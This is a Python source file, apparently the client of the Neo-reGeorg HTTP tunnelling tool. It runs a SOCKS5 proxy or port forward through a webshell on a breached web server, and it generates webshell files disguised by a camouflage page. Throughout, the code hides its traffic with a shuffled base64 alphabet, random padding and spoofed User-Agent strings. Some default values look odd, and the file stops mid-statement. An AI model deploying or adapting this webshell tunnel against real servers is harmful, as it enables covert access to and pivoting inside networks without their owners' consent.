#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__  = 'L'
__version__ = '5.2.0'

import sys
import os
import re
import base64
import struct
import random
import hashlib
import logging
import argparse
import requests
import uuid
import codecs
from collections import defaultdict
from time import sleep, time, mktime
from datetime import datetime
from socket import *
from itertools import chain
from threading import Thread

requests.packages.urllib3.disable_warnings()

ROOT = os.path.dirname(os.path.realpath(__file__))

ispython3 = True if sys.version_info >= (3, 0) else False

# Constants
SOCKTIMEOUT       = 5
VER               = b"\x05"
METHOD            = b"\x00"
SUCCESS           = b"\x00"
REFUSED           = b"\x05"
#SOCKFAIL         = b"\x01"
#NETWORKFAIL      = b"\x02"
#HOSTFAIL         = b"\x04"
#TTLEXPIRED       = b"\x06"
#UNSUPPORTCMD     = b"\x07"
#ADDRTYPEUNSPPORT = b"\x08"
#UNASSIGNED       = b"\x09"

# Globals
READBUFSIZE   = 7
MAXTHERADS    = 400
MAXRETRY      = 10
READINTERVAL  = 300
WRITEINTERVAL = 200
PHPSERVER     = False
PHPSKIPCOOKIE = False
GOSERVER      = False
PHPTIMEOUT    = 0.5

# Logging
RESET_SEQ = "\033[0m"
COLOR_SEQ = "\033[1;%dm"
BOLD_SEQ  = "\033[1m"

BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE = range(8)

# CRITICAL > ERROR > WARNING > INFO > DEBUG > NOTSET
LEVEL = [
    ('ERROR', logging.ERROR),
    ('WARNING', logging.WARNING),
    ('INFO', logging.INFO),
    ('DEBUG', logging.DEBUG),
]

COLORS = {
    'WARNING':  YELLOW,
    'INFO':     WHITE,
    'DEBUG':    BLUE,
    'CRITICAL': YELLOW,
    'ERROR':    RED,
    'RED':      RED,
    'GREEN':    GREEN,
    'YELLOW':   YELLOW,
    'BLUE':     BLUE,
    'MAGENTA':  MAGENTA,
    'CYAN':     CYAN,
    'WHITE':    WHITE,
}

BLVHEAD = {
    'DATA':          1,
    'CMD':           2,
    'MARK':          3,
    'STATUS':        4,
    'ERROR':         5,
    'IP':            6,
    'PORT':          7,
    'REDIRECTURL':   8,
    'FORCEREDIRECT': 9,
}
BLVHEAD_REVERSE = {}
for k, v in BLVHEAD.items():
    BLVHEAD_REVERSE[v] = k
BLVHEAD_LEN = len(BLVHEAD)


def blv_encode(info):
    head_len = random.randint(5, 20)
    tail_len = random.randint(5, 20)
    head_rand = os.urandom(head_len)
    tail_rand = os.urandom(tail_len)

    data = struct.pack('>bi{len}s'.format(len=head_len), 0, head_len + BLV_L_OFFSET, head_rand)  # 头部填充

    for k, v in info.items():
        if v:
            b = BLVHEAD[k]
            if ispython3 and type(v) == str:
                v = v.encode()
            l = len(v)
            data += struct.pack('>bi{len}s'.format(len=l), b, l + BLV_L_OFFSET, v)


    data += struct.pack('>bi{len}s'.format(len=tail_len), 39, tail_len + BLV_L_OFFSET, tail_rand)  # 尾部填充
    return data


def blv_decode(data):
    data_len = len(data)
    if data_len == 0:
        return None

    info = defaultdict(bytes)
    i = 0

    while i < data_len:
        try:
            b, l = struct.unpack('>bi', data[i:i+5])
            l -= BLV_L_OFFSET
        except struct.error:
            return None
        i += 5
        v = data[i:i+l]
        i += l
        if i > data_len:
            return None

        if b > 0 and b < BLVHEAD_LEN:
            name = BLVHEAD_REVERSE[b]
            if name != 'DATA':
                if name != 'ERROR':
                    v = v.decode()
                else:
                    try:
                        try:
                            v = v.decode()
                        except UnicodeDecodeError:
                            try:
                                v = v.decode('gbk')
                            except:
                                pass
                    except Exception as ex:
                        log.error("[BLV Decode] [%s] => %s" % (name, repr(v)))
                        raise ex
            info[name] = v

    return info


def int_to_bytes(n):
    h = '%x' % n
    if len(h) % 2 != 0:
        h = '0' + h
    return codecs.decode(h, 'hex')

def encode_body(info):
    data = blv_encode(info)
    data = base64.b64encode(data)
    if ispython3:
        data = data.decode()

    data = data.translate(EncodeMap)
    if request_template:
        data = request_template[0] + data + request_template[1]

    return data


def decode_body(data):
    if ispython3:
        data = data.decode()
    try:
        data = base64.b64decode(data.translate(DecodeMap))
    except:
        raise NeoregReponseFormatError("Base64 decode error")
    return blv_decode(data)


def file_read(filename):
    try:
        with codecs.open(filename, encoding="utf-8") as f:
            return f.read()
    except:
        log.error("[Generate] Failed to read file: %s" % filename)
        exit()


def file_write(filename, data):
    try:
        with open(filename, 'w') as f:
            f.write(data)
    except:
        log.error("[Generate] Failed to write file: %s" % filename)
        exit()


def formatter_message(message, use_color=True):
    if use_color:
        message = message.replace("$RESET", RESET_SEQ).replace("$BOLD", BOLD_SEQ)
    else:
        message = message.replace("$RESET", "").replace("$BOLD", "")
    return message


class ColoredFormatter(logging.Formatter):
    def __init__(self, msg, use_color=True):
        logging.Formatter.__init__(self, msg)
        self.use_color = use_color

    def format(self, record):
        levelname = record.levelname
        if self.use_color and levelname in COLORS:
            levelname_color = COLOR_SEQ % (30 + COLORS[levelname]) + levelname + RESET_SEQ
            record.levelname = levelname_color
        return logging.Formatter.format(self, record)


class ColoredLogger(logging.Logger):

    def __init__(self, name):
        use_color = not sys.platform.startswith('win')
        FORMAT = "[$BOLD%(levelname)-19s$RESET]  %(message)s"
        COLOR_FORMAT = formatter_message(FORMAT, use_color)
        logging.Logger.__init__(self, name, 'INFO')
        if (name == "transfer"):
            COLOR_FORMAT = "\x1b[80D\x1b[1A\x1b[K%s" % COLOR_FORMAT
        color_formatter = ColoredFormatter(COLOR_FORMAT, use_color)
        console = logging.StreamHandler()
        console.setFormatter(color_formatter)
        self.addHandler(console)


logging.setLoggerClass(ColoredLogger)
log = logging.getLogger(__name__)
transferLog = logging.getLogger("transfer")


class SocksCmdNotImplemented(Exception):
    pass


class NeoregReponseFormatError(Exception):
    pass


class Rand:
    def __init__(self, key):
        salt = b'11f271c6lm0e9ypkptad1uv6e1ut1fu0pt4xillz1w9bbs2gegbv89z9gca9d6tbk025uvgjfr331o0szln'
        key_min_len = 28
        # 密码强度不足时，使用加盐hash
        if len(key) < key_min_len:
            key_hash = hashlib.md5(salt[:key_min_len] + key.encode() + salt[key_min_len:]).hexdigest()
        else:
            key_hash = key
        n = int(codecs.encode(key_hash[:key_min_len].encode(), 'hex'), 16)
        self.v_clen = pow(n, int(salt[:key_min_len],36), int(salt[key_min_len:],36))
        random.seed(n)

    def rand_value(self):
        rand = base64.b64encode(int_to_bytes((random.getrandbits(int(random.random() * 300) + 30) << 280)+self.v_clen))
        if ispython3:
            rand = rand.decode()
        return rand.rstrip('=')

    def base64_chars(self, charslist):
        if sys.version_info >= (3, 2):
            newshuffle = random.shuffle
        else:
            try:
                xrange
            except NameError:
                xrange = range
            def newshuffle(x):
                def _randbelow(n):
                    getrandbits = random.getrandbits
                    k = n.bit_length()
                    r = getrandbits(k)
                    while r >= n:
                        r = getrandbits(k)
                    return r

                for i in xrange(len(x) - 1, 0, -1):
                    j = _randbelow(i+1)
                    x[i], x[j] = x[j], x[i]

        newshuffle(charslist)


class session(Thread):
    def __init__(self, conn, pSocket, connectURLs, redirectURLs, FwdTarget, force_redirect):
        Thread.__init__(self)
        self.pSocket = pSocket
        self.connectURLs = connectURLs
        self.conn = conn
        self.connect_closed = False
        self.session_connected = False
        self.fwd_target = FwdTarget
        self.redirectURL = None
        self.force_redirect = force_redirect
        if redirectURLs:
            self.redirectURL = random.choice(redirectURLs)


    def url_sample(self):
        return random.choice(self.connectURLs)


    def session_mark(self):
        mark = base64.b64encode(uuid.uuid4().bytes)[0:-8]
        if ispython3:
            mark = mark.decode()
        return mark


    def parseSocks5(self, sock):
        log.debug("[SOCKS5] Version5 detected")
        nmethods = sock.recv(1)
        methods = sock.recv(ord(nmethods))
        sock.sendall(VER + METHOD)
        ver = sock.recv(1)
        if ver == b"\x02":                # this is a hack for proxychains
            ver, cmd, rsv, atyp = (sock.recv(1), sock.recv(1), sock.recv(1), sock.recv(1))
        else:
            cmd, rsv, atyp = (sock.recv(1), sock.recv(1), sock.recv(1))
        target = None
        targetPort = None
        if atyp == b"\x01":      # IPv4
            target = sock.recv(4)
            targetPort = sock.recv(2)
            target = inet_ntoa(target)
        elif atyp == b"\x03":             # Hostname
            targetLen = ord(sock.recv(1)) # hostname length (1 byte)
            target = sock.recv(targetLen)
            targetPort = sock.recv(2)
            if LOCALDNS:
                try:
                    target = gethostbyname(target)
                except:
                    log.error("[SOCKS5] DNS resolution failed: (%s)" % target.decode())
                    return False
            else:
                target = target.decode()
        elif atyp == b"\x04":    # IPv6
            target = sock.recv(16)
            targetPort = sock.recv(2)
            target = inet_ntop(AF_INET6, target)

        if targetPort == None:
            return False

        targetPortNum = struct.unpack('>H', targetPort)[0]

        if cmd == b"\x02":   # BIND
            raise SocksCmdNotImplemented("Socks5 - BIND not implemented")
        elif cmd == b"\x03": # UDP
            raise SocksCmdNotImplemented("Socks5 - UDP not implemented")
        elif cmd == b"\x01": # CONNECT
            try:
                serverIp = inet_aton(target)
            except:
                # Forged temporary address 127.0.0.1
                serverIp = inet_aton('127.0.0.1')
            mark = self.setupRemoteSession(target, targetPortNum)
            if mark:
                sock.sendall(VER + SUCCESS + b"\x00" + b"\x01" + serverIp + targetPort)
                return True
            else:
                sock.sendall(VER + REFUSED + b"\x00" + b"\x01" + serverIp + targetPort)
                return False

        raise SocksCmdNotImplemented("Socks5 - Unknown CMD")


    def handleSocks(self, sock):
        try:
            ver = sock.recv(1)
            if ver == b"\x05":
                res = self.parseSocks5(sock)
                if not res:
                    sock.close()
                return res
            elif ver == b'':
                log.error("[SOCKS5] Failed to get version")
            else:
                log.error("[SOCKS5] Only support Socks5 protocol")
                return False
        except OSError:
            return False
        except timeout:
            return False


    def handleFwd(self, sock):
        log.debug("[PORT FWD] Forward detected")
        host, port = self.fwd_target.split(':', 1)
        mark = self.setupRemoteSession(host, int(port))
        return bool(mark)


    def neoreg_request(self, info, timeout=None):
        if self.redirectURL:
            info['REDIRECTURL'] = self.redirectURL
            if self.force_redirect:
                info['FORCEREDIRECT'] = 'TRUE'
            else:
                info['FORCEREDIRECT'] = 'FALSE'

        data = encode_body(info)
        log.debug("[HTTP] [%s:%d] %s Request (%s)" % (self.target, self.port, info['CMD'], self.mark))

        retry = 0
        while True:
            retry += 1
            try:
                response = self.conn.post(self.url_sample(), headers=HEADERS, timeout=timeout, data=data)
                second = response.elapsed.total_seconds()
                log.debug("[HTTP] [%s:%d] %s Response (%s) => HttpCode: %d, Time: %.2fs" % (self.target, self.port, info['CMD'], self.mark, response.status_code, second))

                rdata = extract_body(response.content)
                rinfo = decode_body(rdata)
                if rinfo is None:
                    raise NeoregReponseFormatError("[HTTP] Response Format Error: {}".format(response.content))
                else:
                    if rinfo['STATUS'] != 'OK' and info['CMD'] != 'DISCONNECT':
                        log.warning('[%s] [%s:%d] Error: %s' % (info['CMD'], self.target, self.port, rinfo['ERROR']))
                    return rinfo

                # 高并发下，csharp 容易出现 503, 重试即可
                log.warning("[HTTP] [%s:%d] [ReTry %d] %s Request (%s) => HttpCode: %d" % (self.target, self.port, retry, info['CMD'], self.mark, response.status_code))

            except requests.exceptions.ConnectionError as e:
                log.warning('[HTTP] [{}] [requests.exceptions.ConnectionError] {}'.format(info['CMD'], e))
            except requests.exceptions.ChunkedEncodingError as e: # python2 requests error
                log.warning('[HTTP] [{}] [requests.exceptions.ChunkedEncodingError] {}'.format(info['CMD'], e))
            except NeoregReponseFormatError as e: # python2 requests error
                log.warning("[%s] [%s:%d] NeoregReponseFormatError, Retry: No.%d" % (info['CMD'], self.target, self.port, retry))
                if retry > MAXRETRY:
                    raise e


    def setupRemoteSession(self, target, port):
        self.mark = self.session_mark()
        self.target = target.encode()
        self.port = port

        info = {'CMD': 'CONNECT', 'MARK': self.mark, 'IP': self.target, 'PORT': str(self.port)}

        if ( '.php' in self.connectURLs[0] or PHPSERVER ) and not GOSERVER:
            try:
                rinfo = self.neoreg_request(info, timeout=PHPTIMEOUT)
            except:
                log.info("[CONNECT] [%s:%d] Session mark (%s)" % (self.target, self.port, self.mark))
                return self.mark
        else:
            rinfo = self.neoreg_request(info)

        status = rinfo["STATUS"]
        if status == "OK":
            log.info("[CONNECT] [%s:%d] Session mark: %s" % (self.target, self.port, self.mark))
            return self.mark
        else:
            return False


    def closeRemoteSession(self):
        if not self.connect_closed:
            self.connect_closed = True
            try:
                self.pSocket.close()
                log.debug("[DISCONNECT] [%s:%d] Closing localsocket" % (self.target, self.port))
            except:
                if hasattr(self, 'target'):
                    log.debug("[DISCONNECT] [%s:%d] Localsocket already closed" % (self.target, self.port))

            if hasattr(self, 'mark'):
                info = {'CMD': 'DISCONNECT', 'MARK': self.mark}
                rinfo = self.neoreg_request(info)
            if not self.connect_closed:
                if hasattr(self, 'target'):
                    log.info("[DISCONNECT] [%s:%d] Connection Terminated" % (self.target, self.port))
                else:
                    log.error("[DISCONNECT] Connection Terminated")


    def reader(self):
        try:
            info = {'CMD': 'READ', 'MARK': self.mark}
            n = 0
            while True:
                try:
                    if self.connect_closed or self.pSocket.fileno() == -1:
                        break
                    rinfo = self.neoreg_request(info)
                    if rinfo['STATUS'] == 'OK':
                        data = rinfo['DATA']
                        data_len = len(data)

                        if data_len == 0:
                            sleep(READINTERVAL)
                        elif data_len > 0:
                            n += 1
                            transferLog.info("[%s:%d] [%s] No.%d <<<< [%d byte]" % (self.target, self.port, self.mark, n, data_len))
                            while data:
                                writed_size = self.pSocket.send(data)
                                data = data[writed_size:]
                            if data_len < 500:
                                sleep(READINTERVAL)
                    else:
                        break

                except error: # python2 socket.send error
                    pass
                except Exception as ex:
                    log.exception(ex)
                    break
        finally:
            self.closeRemoteSession()


    def writer(self):
        try:
            info = {'CMD': 'FORWARD', 'MARK': self.mark}
            n = 0
            while True:
                try:
                    raw_data = self.pSocket.recv(READBUFSIZE)
                    if not raw_data:
                        break
                    info['DATA'] = raw_data
                    rinfo = self.neoreg_request(info)
                    if rinfo['STATUS'] != "OK":
                        break
                    n += 1
                    transferLog.info("[%s:%d] [%s] No.%d >>>> [%d byte]" % (self.target, self.port, self.mark, n, len(raw_data)))
                    if len(raw_data) < READBUFSIZE:
                        sleep(WRITEINTERVAL)
                except timeout:
                    continue
                except error:
                    break
                except OSError:
                    break
                except Exception as ex:
                    log.exception(ex)
                    break
        finally:
            self.closeRemoteSession()


    def run(self):
        try:
            if self.fwd_target:
                self.session_connected = self.handleFwd(self.pSocket)
            else:
                self.session_connected = self.handleSocks(self.pSocket)

            if self.session_connected:
                r = Thread(target=self.reader)
                w = Thread(target=self.writer)
                r.start()
                w.start()
                r.join()
                w.join()
        except NeoregReponseFormatError as ex:
            log.error('[HTTP] [NeoregReponseFormatError] {}'.format(ex))
        except SocksCmdNotImplemented as ex:
            log.error('[SOCKS5] [SocksCmdNotImplemented] {}'.format(ex))
        except requests.exceptions.ConnectionError as ex:
            log.warning('[HTTP] [requests.exceptions.ConnectionError] {}'.format(ex))
        except Exception as ex:
            log.exception(ex)
        finally:
            if self.session_connected:
                self.closeRemoteSession()


def askNeoGeorg(conn, connectURLs, redirectURLs, force_redirect):
    # only check first
    log.info("[Ask NeoGeorg] Checking if NeoGeorg is ready")
    headers = {}
    headers.update(HEADERS)

    if INIT_COOKIE:
        headers['Cookie'] = INIT_COOKIE

    need_exit = False
    try:
        log.debug("[HTTP] Ask NeoGeorg Request".format())
        if redirectURLs:
            info = {'REDIRECTURL': redirectURLs[0]}
            if force_redirect:
                info['FORCEREDIRECT'] = 'TRUE'
            else:
                info['FORCEREDIRECT'] = 'FALSE'
            data = encode_body(info)
            headers.update({'Content-type': 'application/octet-stream'})
            response = conn.post(connectURLs[0], headers=headers, timeout=10, data=data)
        else:
            response = conn.get(connectURLs[0], headers=headers, timeout=10)
        log.debug("[HTTP] Ask NeoGeorg Response => HttpCode: {}".format(response.status_code))
        if not PHPSKIPCOOKIE and ( '.php' in connectURLs[0] or PHPSERVER ):
            if 'Expires' in response.headers:
                expires = response.headers['Expires']
                try:
                    expires_date = datetime.strptime(expires, '%a, %d %b %Y %H:%M:%S %Z')
                    if mktime(expires_date.timetuple()) < time():
                        log.warning('[Ask NeoGeorg] Server Session expired')
                        if 'Set-Cookie' in response.headers:
                            cookie = ''
                            for k, v in response.cookies.items():
                                cookie += '{}={};'.format(k, v)
                            HEADERS.update({'Cookie' : cookie})
                            log.warning("[Ask NeoGeorg] Automatically append Cookies: {}".format(cookie))
                        else:
                            log.error('[Ask NeoGeorg] There is no valid cookie return')
                            need_exit = True
                except ValueError:
                    log.warning('[Ask NeoGeorg] Expires wrong format: {}'.format(expires))
    except requests.exceptions.ConnectionError:
        log.error("[Ask NeoGeorg] NeoGeorg server connection errer")
        exit()
    except requests.exceptions.ConnectTimeout:
        log.error("[Ask NeoGeorg] NeoGeorg server connection timeout")
        exit()
    except Exception as ex:
        log.error("[Ask NeoGeorg] NeoGeorg is not ready, please check URL")
        log.exception(ex)
        exit()

    if need_exit:
        exit()

    if redirectURLs and response.status_code >= 400:
        log.warning('[Ask NeoGeorg] Using redirection will affect performance when the response code >= 400')

    data = response.content
    data = extract_body(data)

    if BASICCHECKSTRING == data.strip():
        log.info("[Ask NeoGeorg] NeoGeorg says, 'All seems fine'")
        return True
    elif BASICCHECKSTRING in data:
        left_offset = data.index(BASICCHECKSTRING)
        right_offset = len(data) - ( left_offset + len(BASICCHECKSTRING) )
        log.error("[Ask NeoGeorg] NeoGeorg is ready, but the body needs to be offset")
        args_tips = ''
        if left_offset:
            args_tips += ' --cut-left {}'.format(left_offset)
        if right_offset:
            args_tips += ' --cut-right {}'.format(right_offset)
        log.error("[Ask NeoGeorg] You can set the `{}` parameter to body offset".format(args_tips))
        exit()
    else:
        if args.skip:
            log.debug("[Ask NeoGeorg] Ignore detecting that NeoGeorg is ready")

        else:
            log.warning('[Ask NeoGeorg] Expect Response: {}'.format(BASICCHECKSTRING[0:100]))
            log.warning('[Ask NeoGeorg] Real Response: {}'.format(data.strip()[0:100]))
            log.error("[Ask NeoGeorg] NeoGeorg is not ready, please check URL and KEY. rep: [{}] {}".format(response.status_code, response.reason))
            log.error("[Ask NeoGeorg] You can set the `--skip` parameter to ignore errors")
            exit()


def extract_body(data):
    if args.cut_left > 0:
        data = data[args.cut_left:]
    if args.cut_right > 0:
        data = data[:-args.cut_right]
    if args.extract:
        match = EXTRACT_EXPR.search(data.decode())
        if match:
            data = match[1].encode()
    return data


def choice_useragent():
    user_agents = [
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16",
       "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
       "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
       "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.11 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.11",
       "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0",
       "Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0",
       "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0",
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:38.0) Gecko/20100101 Firefox/38.0"
    ]
    return random.choice(user_agents)



banner = r"""

          "$$$$$$''  'M$  '$$$@m
        :$$$$$$$$$$$$$$''$$$$'
       '$'    'JZI'$$&  $$$$'
                 '$$$  '$$$$
                 $$$$  J$$$$'
                m$$$$  $$$$,
                $$$$@  '$$$$_          Neo-reGeorg
             '1t$$$$' '$$$$<
          '$$$$$$$$$$'  $$$$          version {}
               '@$$$$'  $$$$'
                '$$$$  '$$$@
             'z$$$$$$  @$$$
                r$$$   $$|
                '$$v c$$
               '$$v $$v$$$$$$$$$#
               $$x$$$$$$$$$twelve$$$@$'
             @$$$@L '    '<@$$$$$$$$`
           $$                 '$$$


    [ Github ] https://github.com/L-codes/Neo-reGeorg
""".format(__version__)

use_examples = r"""
                [ Basic Use ]

   ./neoreg.py generate -k <you_password>
   ./neoreg.py -k <you_password> -u <server_url>

               [ Advanced Use ]

   ./neoreg.py generate -k <you_password> --file 404.html
   ./neoreg.py -k <you_password> -u <server_url> \
           --skip --proxy http://127.0.0.1:8080 -vv \
           -H 'Authorization: cm9vdDppcyB0d2VsdmU='

"""

if __name__ == '__main__':
    if len(sys.argv) == 1:
        print(banner)
        print(use_examples)
        exit()
    elif len(sys.argv) > 1 and sys.argv[1] == 'generate':
        del sys.argv[1]
        parser = argparse.ArgumentParser(description='Generate neoreg webshell')
        parser.add_argument("-k", "--key", metavar="KEY", required=True, help="Specify connection key.")
        parser.add_argument("-o", "--outdir", metavar="DIR", help="Output directory.", default='neoreg_servers')
        parser.add_argument("-f", "--file", metavar="FILE", help="Camouflage html page file")
        parser.add_argument("-c", "--httpcode", metavar="CODE", help="Specify HTTP response code. When using -r, it is recommended to <400 (default: 200)", type=int, default=200)
        parser.add_argument("-T", "--request-template", metavar="STR/FILE", help="HTTP request template (eg: 'img=data:image/png;base64,NEOREGBODY&save=ok')", type=str)
        parser.add_argument("--read-buff", metavar="Bytes", help="Remote read buffer (default: 513)", type=int, default=513)
        parser.add_argument("--max-read-size", metavar="KB", help="Remote max read size (default: 512)", type=int, default=512)
        args = parser.parse_args()
    else:
        parser = argparse.ArgumentParser(description="Socks server for Neoreg HTTP(s) tunneller (DEBUG MODE: -k debug)")
        parser.add_argument("-u", "--url", metavar="URI", required=True, help="The url containing the tunnel script", action='append')
        parser.add_argument("-r", "--redirect-url", metavar="URL", help="Intranet forwarding the designated server (only java/.net)", action='append')
        parser.add_argument("-R", "--force-redirect", help="Forced forwarding (only jsp -r)", action='store_true')
        parser.add_argument("-t", "--target", metavar="IP:PORT", help="Network forwarding Target, After setting this parameter, port forwarding will be enabled")
        parser.add_argument("-k", "--key", metavar="KEY", required=True, help="Specify connection key")
        parser.add_argument("-l", "--listen-on", metavar="IP", help="The default listening address (default: 127.0.0.1)", default="127.0.0.1")
        parser.add_argument("-p", "--listen-port", metavar="PORT", help="The default listening port (default: 1080)", type=int, default=1080)
        parser.add_argument("-s", "--skip", help="Skip usability testing", action='store_true')
        parser.add_argument("-H", "--header", metavar="LINE", help="Pass custom header LINE to server", action='append', default=[])
        parser.add_argument("-c", "--cookie", metavar="LINE", help="Custom init cookies")
        parser.add_argument("-x", "--proxy", metavar="LINE", help="Proto://host[:port]  Use proxy on given port", default=None)
        parser.add_argument("-T", "--request-template", metavar="STR/FILE", help="HTTP request template (eg: 'img=data:image/png;base64,NEOREGBODY&save=ok')", type=str)
        parser.add_argument("--php", help="Use php connection method", action='store_true')
        parser.add_argument("--php-skip-cookie", help="Skip cookie availability check in php", action='store_true')
        parser.add_argument("--go", help="Use go connection method", action='store_true')
        parser.add_argument("--php-connect-timeout", metavar="S", help="PHP connect timeout (default: {})".format(PHPTIMEOUT), type=float, default=PHPTIMEOUT)
        parser.add_argument("--local-dns", help="Use local resolution DNS", action='store_true')
        parser.add_argument("--read-buff", metavar="KB", help="Local read buffer, max data to be sent per POST (default: {}, max: 50)".format(READBUFSIZE), type=int, default=READBUFSIZE)
        parser.add_argument("--read-interval", metavar="MS", help="Read data interval in milliseconds (default: {})".format(READINTERVAL), type=int, default=READINTERVAL)
        parser.add_argument("--write-interval", metavar="MS", help="Write data interval in milliseconds (default: {})".format(WRITEINTERVAL), type=int, default=WRITEINTERVAL)
        parser.add_argument("--max-threads", metavar="N", help="Proxy max threads (default: {})".format(MAXTHERADS), type=int, default=MAXTHERADS)
        parser.add_argument("--max-retry", metavar="N", help="Max retry requests (default: {})".format(MAXRETRY), type=int, default=MAXRETRY)
        parser.add_argument("--cut-left", metavar="N", help="Truncate the left side of the response body", type=int, default=0)
        parser.add_argument("--cut-right", metavar="N", help="Truncate the right side of the response body", type=int, default=0)
        parser.add_argument("--extract", metavar="EXPR", help="Manually extract BODY content (eg: <html><p>NEOREGBODY</p></html> )")
        parser.add_argument("-v", help="Increase verbosity level (use -vv or more for greater effect)", action='count', default=0)
        args = parser.parse_args()

        if args.extract:
            if 'NEOREGBODY' not in args.extract:
                print('[!] Error extracting expression, `NEOREGBODY` not found')
                exit()
            else:
                expr = re.sub('NEOREGBODY', r'\\s*([A-Za-z0-9+/]*(?:=|==)?|<!-- [a-zA-Z0-9+/]+ -->)\\s*', re.escape(args.extract))
                EXTRACT_EXPR = re.compile(expr, re.S)

    global request_template
    request_template = None
    if args.request_template:
        try:
            data = open(args.request_template).read()
            request_template = data
        except:
            request_template = args.request_template

        if 'NEOREGBODY' in request_template:
            request_template = request_template.split('NEOREGBODY', 1)
        else:
            print('[!] Error request template, `NEOREGBODY` not found')
            exit()


    rand = Rand(args.key)
    BLV_L_OFFSET = random.getrandbits(31)

    BASE64CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    if args.key == 'debug':
        M_BASE64CHARS = BASE64CHARS
    else:
        M_BASE64CHARS = list(BASE64CHARS)
        rand.base64_chars(M_BASE64CHARS)
        M_BASE64CHARS = ''.join(M_BASE64CHARS)

    if ispython3:
        maketrans = str.maketrans
    else:
        from string import maketrans

    EncodeMap = maketrans(BASE64CHARS, M_BASE64CHARS)
    DecodeMap = maketrans(M_BASE64CHARS, BASE64CHARS)

    BASICCHECKSTRING = ('<!-- ' + rand.rand_value() + ' -->').encode()

    if 'url' in args:
        # neoreg connect
        if args.v > 3:
            args.v = 3

        LOCALDNS = args.local_dns

        LEVELNAME, LEVELLOG = LEVEL[args.v]
        log.setLevel(LEVELLOG)
        transferLog.setLevel(LEVELLOG)
        separation = "+" + "-" * 72 + "+"
        print(banner)
        print(separation)
        print("  Log Level set to [%s]" % LEVELNAME)

        USERAGENT     = choice_useragent()
        PHPSERVER     = args.php
        GOSERVER      = args.go
        PHPTIMEOUT    = args.php_connect_timeout
        PHPSKIPCOOKIE = args.php_skip_cookie

        urls = args.url
        redirect_urls = args.redirect_url

        HEADERS = {}
        for header in args.header:
            if ':' in header:
                key, value = header.split(':', 1)
                HEADERS[key.strip()] = value.strip()
            else:
                print("\nError parameter: -H %s" % header)
                exit()

        INIT_COOKIE = args.cookie
        PROXY = { 'http': args.proxy, 'https': args.proxy } if args.proxy else None

        if args.target:
            if not re.match(r'[^:]+:\d+', args.target):
                print("[!] Target parameter error: {}".format(args.target))
                exit()
            print("  Starting Forward [%s:%d] => [%s]" % (args.listen_on, args.listen_port, args.target))
        else:
            print("  Starting SOCKS5 server [%s:%d]" % (args.listen_on, args.listen_port))


        print("  Tunnel at:")
        for url in urls:
            print("    "+url)

        if args.proxy:
            print("  Client Proxy:\n    "+ args.proxy)

        if redirect_urls:
            print("  Redirect to:")
            for url in args.redirect_url:
                print("    "+url)

        print(separation)
        try:
            conn = requests.Session()
            conn.proxies = PROXY
            conn.verify = False
            conn.headers['Accept-Encoding'] = 'gzip, deflate'
            conn.headers['User-Agent'] = USERAGENT

            servSock_start = False
            askNeoGeorg(conn, urls, redirect_urls, args.force_redirect)

            if 'Content-type' not in HEADERS:
                HEADERS['Content-type'] = 'application/octet-stream'

            READBUFSIZE   = min(args.read_buff, 50) * 1024
            MAXTHERADS    = args.max_threads
            MAXRETRY      = args.max_retry
            READINTERVAL  = args.read_interval  /   1000.0
            WRITEINTERVAL = args.write_interval /   1000.0

            try:
                servSock = socket(AF_INET, SOCK_STREAM)
                servSock_start = True
                servSock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
                servSock.bind((args.listen_on, args.listen_port))
                servSock.listen(MAXTHERADS)
            except Exception as e:
                log.error("[Server Listen] {}".format(e))
                exit()

            while True:
                try:
                    sock, addr_info = servSock.accept()
                    sock.settimeout(SOCKTIMEOUT)
                    session(conn, sock, urls, redirect_urls, args.target, args.force_redirect).start()
                except KeyboardInterrupt as ex:
                    break
                except timeout:
                    log.error("[SOCKS5] Connect Timeout from {}:{}".format(addr_info[0], addr_info[1]))
                    if sock:
                        sock.close()
                except OSError:
                    if sock:
                        sock.close()
                except error:
                    pass
                except Exception as ex:
                    log.exception(ex)
                    raise e
        except requests.exceptions.ProxyError:
            log.error("[HTTP] Unable to connect proxy: %s" % args.proxy)
        except requests.exceptions.ConnectionError:
            log.error("[HTTP] Can not connect to the web server")
        finally:
            if servSock_start:
                servSock.close()
    else:
        # neoreg server generate
        print(banner)
        READBUF = args.read_buff
        MAXREADSIZE = args.max_read_size * 1024
        outdir = args.outdir
        if not os.path.isdir(outdir):
            os.mkdir(outdir)
            print('    [+] Mkdir a directory: %s' % outdir)

        keyfile = os.path.join(outdir, 'key.txt')
        file_write(keyfile, args.key)

        M_BASE64ARRAY = []
        for i in range(128):
            if chr(i) in BASE64CHARS:
                num = M_BASE64CHARS.index(chr(i))
                M_BASE64ARRAY.append(num)
            else:
                M_BASE64ARRAY.append(-1)

        script_dir = os.path.join(ROOT, 'templates')
        print("    [+] Create neoreg server files:")

        if args.file:
            http_get_content = file_read(args.file)
        else:
            http_get_content = BASICCHECKSTRING.decode()

        if ispython3:
            http_get_content = http_get_content.encode()
        neoreg_hello = base64.b64encode(http_get_content)
        if ispython3:
            neoreg_hello = neoreg_hello.decode()
        neoreg_hello = neoreg_hello.translate(EncodeMap)

        request_template_start_index = 0
        request_template_end_index = 0
        if request_template:
